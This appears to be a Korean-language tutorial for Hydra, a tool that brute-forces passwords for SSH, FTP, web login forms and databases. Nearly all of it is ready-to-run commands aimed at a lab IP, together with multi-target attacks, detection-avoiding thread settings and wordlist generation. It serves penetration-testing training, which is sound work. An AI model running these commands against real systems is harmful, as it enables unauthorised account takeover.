# Hydra 비밀번호 크래킹 가이드

네트워크 기반 로그인 서비스(SSH, FTP, HTTP 등)의 비밀번호를 무차별 대입으로 찾는 도구입니다.

## 설치

Kali는 기본 설치되어 있습니다.

```bash
# 설치 확인
hydra --version

# 필요 시 설치
sudo apt update && sudo apt install -y hydra hydra-gtk
```

## 기본 개념

Hydra는 다음을 필요로 합니다:

- 대상 서버 (IP와 포트)
- 사용자명 또는 사용자명 리스트
- 비밀번호 또는 비밀번호 리스트
- 프로토콜 (ssh, ftp, http-post-form 등)

비밀번호 리스트는 `/usr/share/wordlists/rockyou.txt` (Kali 기본) 사용

## 빠른 시작 (단계별)

### 1단계: 단일 사용자 대상 SSH 크래킹

```bash
# 기본형: hydra -l [사용자명] -P [비밀번호리스트] [IP] [서비스]
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.10.11.68
```

옵션 설명:
- `-l root`: 단일 사용자명 (root)
- `-P 리스트파일`: 비밀번호 리스트
- `ssh://IP`: SSH 서비스 대상
- 기본 포트 22 사용

성공하면: `[22][ssh] host: 10.10.11.68 login: root password: abc123` 형식으로 표시

### 2단계: 다중 사용자 크래킹

```bash
# 여러 사용자 시도 (속도 향상)
hydra -L users.txt -P passwords.txt ssh://10.10.11.68 -t 4
```

옵션:
- `-L users.txt`: 사용자명 리스트
- `-t 4`: 동시 스레드 4개 (기본 16, 많을수록 빠르지만 탐지 위험)

### 3단계: HTTP 로그인 폼 크래킹

```bash
# HTTP POST 형식 지정 필요
hydra -l admin -P passwords.txt 10.10.11.68 http-post-form \
"/login.php:username=^USER^&password=^PASS^:F=로그인실패"
```

구문:
- `/login.php`: 로그인 페이지 경로
- `username=^USER^`: 사용자명 파라미터
- `password=^PASS^`: 비밀번호 파라미터
- `F=로그인실패`: 실패 시 표시되는 문구 (정확히!)

### 4단계: 포트 지정해서 크래킹

```bash
# 비표준 포트 사용
hydra -l admin -P passwords.txt 10.10.11.68 -s 2222 ssh
```

옵션: `-s [포트번호]`

### 5단계: 상세 정보 보며 실행

```bash
# 시도 중인 계정/비밀번호를 실시간으로 보기
hydra -l root -P passwords.txt ssh://10.10.11.68 -V

# 매우 상세히 (디버그)
hydra -l root -P passwords.txt ssh://10.10.11.68 -vv
```

## 실제 사용 시나리오

### 시나리오 1: SSH 서버 크래킹

목표: SSH 서버의 root 계정 비밀번호 찾기

```bash
# 1단계: 빠른 크래킹 (일반적인 비밀번호부터)
hydra -l root -P passwords-common.txt ssh://10.10.11.68 -t 4 -V

# 2단계: 성공하지 못했다면 전체 리스트로
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.10.11.68 -t 4

# 3단계: 여전히 실패했다면 사용자명도 모르는 경우
hydra -L users.txt -P passwords.txt ssh://10.10.11.68 -t 4
```

결과 해석: `[22][ssh] host: 10.10.11.68 login: root password: password123`

### 시나리오 2: 웹 로그인 폼 크래킹

목표: 웹 애플리케이션의 관리자 계정 접근

```bash
# 1단계: 로그인 폼 분석
# 브라우저의 개발자 도구 > Network에서 로그인 요청 분석
# POST /admin/login.php
# 파라미터: username=admin&password=test&submit=Login
# 실패 메시지: "Invalid credentials"

# 2단계: 크래킹
hydra -l admin -P passwords.txt 10.10.11.68 http-post-form \
"/admin/login.php:username=^USER^&password=^PASS^&submit=Login:F=Invalid credentials"

# 3단계: 성공 시 해당 계정으로 로그인
```

### 시나리오 3: FTP 서버 크래킹

목표: FTP 접근 권한 확보

```bash
# Anonymous 계정부터 시도
hydra -l anonymous -P passwords.txt ftp://10.10.11.68 -V

# 실패하면 일반 사용자 계정으로
hydra -L users.txt -P passwords.txt ftp://10.10.11.68 -t 8
```

### 시나리오 4: 데이터베이스 크래킹

목표: MySQL/MariaDB 접근

```bash
# MySQL
hydra -l root -P passwords.txt mysql://10.10.11.68

# PostgreSQL
hydra -l postgres -P passwords.txt postgres://10.10.11.68
```

### 시나리오 5: 여러 프로토콜 동시 시도

```bash
# SSH, FTP, HTTP 모두 시도
hydra -l admin -P passwords.txt 10.10.11.68 ssh ftp http-post-form "/login.php:user=^USER^&pass=^PASS^:F=failed" -t 4
```

## 주요 옵션

| 옵션 | 의미 | 사용 시기 |
|------|------|---------|
| `-l [사용자]` | 단일 사용자명 | 사용자명을 알 때 |
| `-L [파일]` | 사용자명 리스트 | 사용자명을 모를 때 |
| `-p [비밀번호]` | 단일 비밀번호 | 특정 비밀번호만 시도 |
| `-P [파일]` | 비밀번호 리스트 | 일반적인 크래킹 |
| `-s [포트]` | 포트 지정 | 비표준 포트 사용 |
| `-t [스레드수]` | 동시 스레드 | 4~16 추천 (탐지 vs 속도) |
| `-T [시간초]` | 타임아웃 | 느린 서버는 증가 |
| `-f` | 첫 성공 시 멈춤 | 첫 계정만 찾으면 됨 |
| `-F` | 모든 로그인 찾기 | 전체 유효한 계정 찾기 |
| `-V` | Verbose (상세) | 시도 중인 계정 보기 |
| `-v` | 더 상세 | 디버그 정보 |
| `-vv` | 매우 상세 | 네트워크 패킷 정보 |
| `-o [파일]` | 결과 저장 | 나중에 검토 |
| `-M [파일]` | 대상 리스트 | 여러 IP 동시 공격 |

## 비밀번호 리스트

```bash
# Kali 기본 리스트
/usr/share/wordlists/rockyou.txt (14MB, 14M 단어)

# 다운로드 (이미 Kali에 있음)
# rockyou.txt는 Kali에 gzip으로 압축되어 있음
gunzip /usr/share/wordlists/rockyou.txt.gz

# 커스텀 리스트 생성
# 1. 기본 단어들
echo -e "password\n123456\nadmin\nroot\ntest" > custom.txt

# 2. crunch로 생성
crunch 8 8 -f /usr/share/crunch/charset.lst lowercase -o custom.txt

# 3. cewl로 대상 웹사이트에서 추출
cewl http://target.com -w custom.txt
```

## 프로토콜별 사용 방법

### SSH
```bash
hydra -l root -P passwords.txt ssh://10.10.11.68
hydra -l root -P passwords.txt ssh://10.10.11.68 -s 2222  # 비표준 포트
```

### FTP
```bash
hydra -l anonymous -P passwords.txt ftp://10.10.11.68
hydra -l ftpuser -P passwords.txt ftp://10.10.11.68 -s 21
```

### HTTP (GET 로그인)
```bash
# 거의 사용 안 함 (기본 인증)
hydra -l admin -P passwords.txt 10.10.11.68 http-get -e nsr
```

### HTTP-POST (웹 폼)
```bash
# 가장 일반적
hydra -l admin -P passwords.txt 10.10.11.68 http-post-form \
"/login:username=^USER^&password=^PASS^:Invalid"
```

구문 분석:
- `/login`: 로그인 페이지 경로
- `username=^USER^`: 사용자명 입력 필드
- `password=^PASS^`: 비밀번호 입력 필드
- `Invalid`: 실패 메시지 (정확히 일치해야 함!)

### HTTP-POST (세션)
```bash
# 쿠키가 필요한 경우
hydra -l admin -P passwords.txt 10.10.11.68 http-post-form \
"/login:user=^USER^&pass=^PASS^:F=failed:C=/COOKIES.txt"
```

### MySQL
```bash
hydra -l root -P passwords.txt mysql://10.10.11.68
hydra -l root -P passwords.txt mysql://10.10.11.68 -s 3306
```

## 결과 해석

```
[22][ssh] host: 10.10.11.68 login: root password: admin123
[21][ftp] host: 10.10.11.68 login: ftpuser password: ftppass

의미:
- [포트][프로토콜]: 서비스 정보
- host: 대상 IP
- login: 유효한 사용자명
- password: 유효한 비밀번호
```

## 팁과 주의사항

- 팁 1: HTTP 폼의 실패 메시지는 정확하게 (공백까지!)
  - 개발자 도구 > 응답에서 복사 후 정확히 입력
- 팁 2: 느린 크래킹이 의심되면 -t 값을 낮춤 (4~8)
- 팁 3: 결과를 파일로 저장하면 나중에 검토 가능: `-o results.txt`
- 팁 4: 수백 개 IP를 대상으로 하면 `-M` 옵션 사용
- 팁 5: 스레드를 너무 높이면 서버가 과부하되거나 탐지될 수 있음
- 주의: 허가 없는 크래킹은 불법입니다
- 주의: 실제 대상은 Rate Limit/WAF가 있을 수 있음
- 주의: 실패 후 잠금 정책이 있는 서버는 조심스럽게

## 고급 사용법

### 여러 대상 동시 공격
```bash
# targets.txt에 각 줄마다 IP
hydra -l admin -P passwords.txt -M targets.txt ssh -t 4
```

### 결과 저장 및 재개
```bash
# 처음 시도
hydra -l root -P passwords.txt ssh://10.10.11.68 -o results.txt

# 중단 후 재개 (같은 명령 반복)
hydra -l root -P passwords.txt ssh://10.10.11.68 -o results.txt
# 또는 -x로 진행률 표시
```

### 특정 포지션 비밀번호 생성
```bash
# 8자리 숫자 생성
crunch 8 8 0123456789 -o numbers.txt

# 비밀번호 형식 생성
crunch 6 6 -f /usr/share/crunch/charset.lst mixalpha-numeric -o custom.txt
```

## 관련 도구

- wpscan: WordPress 특화 크래킹
- xhydra: Hydra의 GUI 버전
- medusa: Hydra와 유사한 크래킹 도구
- hashcat: 오프라인 해시 크래킹 (온라인이 아님)

---

공식 문서: https://github.com/vanhauser-thc/thc-hydra
